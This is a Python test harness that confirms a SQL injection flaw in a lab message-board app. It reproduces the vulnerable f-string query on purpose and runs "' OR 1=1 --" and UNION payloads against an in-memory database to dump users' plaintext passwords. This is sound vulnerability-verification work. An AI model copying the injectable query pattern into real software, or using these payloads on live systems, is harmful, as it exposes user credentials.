#!/usr/bin/env python3
"""Harness: Verify SQL injection in run_user_lookup (board/engine.py:71).

Replicates the vulnerable f-string SQL construction and executes it against
an in-memory SQLite database with the same schema and seed data as the app.
"""
import argparse
import sqlite3

MSGS = {
    "t1": ("=== Test 1: Normal query (name=alice) ===", "=== 测试 1：正常查询（name=alice）==="),
    "t2": (
        "=== Test 2: SQL injection payload: ' OR 1=1 -- ===",
        "=== 测试 2：SQL 注入载荷：' OR 1=1 -- ===",
    ),
    "records": ("Records returned:", "返回记录数:"),
    "t3": ("=== Test 3: UNION-based injection ===", "=== 测试 3：UNION 注入 ==="),
    "t4": ("=== Test 4: Constructed SQL ===", "=== 测试 4：构造出的 SQL ==="),
}


def msg(key: str, zh: bool) -> str:
    en, zh_s = MSGS[key]
    return zh_s if zh else en


def run_user_lookup(name: str, conn) -> list[dict]:
    """Exact copy of the vulnerable function from board/engine.py:69-74."""
    sql = f"SELECT id, name, role, email, password FROM users WHERE name = '{name}'"
    rows = conn.execute(sql).fetchall()
    return [dict(r) for r in rows]


def main() -> int:
    p = argparse.ArgumentParser(description="MemoBoard SQLi harness")
    p.add_argument("--zh", action="store_true", help="Print labels in Chinese (default: English)")
    args = p.parse_args()
    zh = args.zh

    conn = sqlite3.connect(":memory:")
    conn.row_factory = sqlite3.Row
    conn.executescript(
        """
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY,
            name TEXT NOT NULL,
            password TEXT NOT NULL,
            role TEXT NOT NULL,
            email TEXT NOT NULL
        );
        """
    )
    conn.executemany(
        "INSERT INTO users(name, password, role, email) VALUES (?, ?, ?, ?)",
        [
            ("alice", "alice123", "user", "alice@memoboard.lab"),
            ("bob", "bob123", "user", "bob@memoboard.lab"),
            ("admin", "admin123", "admin", "admin@memoboard.lab"),
        ],
    )
    conn.commit()

    print(msg("t1", zh))
    result = run_user_lookup("alice", conn)
    print(result)
    assert len(result) == 1 and result[0]["name"] == "alice"

    print(msg("t2", zh))
    injected = run_user_lookup("' OR 1=1 --", conn)
    print(msg("records", zh), len(injected))
    for row in injected:
        print(f"  name={row['name']}, password={row['password']}, role={row['role']}")
    assert len(injected) == 3
    admin = [r for r in injected if r["role"] == "admin"]
    assert len(admin) == 1 and admin[0]["password"] == "admin123"

    print(msg("t3", zh))
    union_rows = run_user_lookup(
        "' UNION SELECT id, name, role, email, password FROM users --",
        conn,
    )
    print(union_rows)
    assert len(union_rows) >= 3

    payload = "' OR 1=1 --"
    sql = f"SELECT id, name, role, email, password FROM users WHERE name = '{payload}'"
    print(msg("t4", zh))
    print(sql)

    conn.close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
